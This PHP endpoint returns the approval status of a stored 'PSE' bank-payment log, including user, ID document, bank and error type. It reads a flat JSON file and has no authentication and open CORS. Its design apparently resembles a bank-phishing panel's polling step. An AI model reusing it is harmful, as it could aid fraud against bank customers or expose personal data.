<?php
/**
 * check_aprobacion.php - Verifica estado de aprobación
 * CORREGIDO - Muestra más información
 */

error_reporting(0);
ini_set('display_errors', 0);

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

$log_id = $_GET['log_id'] ?? null;

if (!$log_id) {
    http_response_code(400);
    echo json_encode(['estado' => 'pendiente', 'error' => 'No log_id']);
    exit;
}

$logsFile = __DIR__ . '/data/pse_logs.json';

if (!file_exists($logsFile)) {
    http_response_code(200);
    echo json_encode(['estado' => 'pendiente', 'error' => 'No logs file']);
    exit;
}

$content = file_get_contents($logsFile);
$logs = json_decode($content, true) ?? [];

// Buscar el log
foreach ($logs as $log) {
    if (isset($log['id']) && $log['id'] === $log_id) {
        http_response_code(200);
        echo json_encode([
            'id' => $log['id'],
            'estado' => $log['estado'] ?? 'pendiente',
            'aprobado' => $log['aprobado'] ?? null,
            'activity' => $log['activity'] ?? '',
            'usuario' => $log['usuario'] ?? $log['documento'] ?? $log['identificacion'] ?? '',
            'documento' => $log['documento'] ?? '',
            'identificacion' => $log['identificacion'] ?? '',
            'banco' => $log['banco'] ?? '',
            'error_tipo' => $log['error_tipo'] ?? null
        ]);
        exit;
    }
}

// No encontrado
http_response_code(200);
echo json_encode(['estado' => 'pendiente', 'id' => $log_id]);
exit;
?>
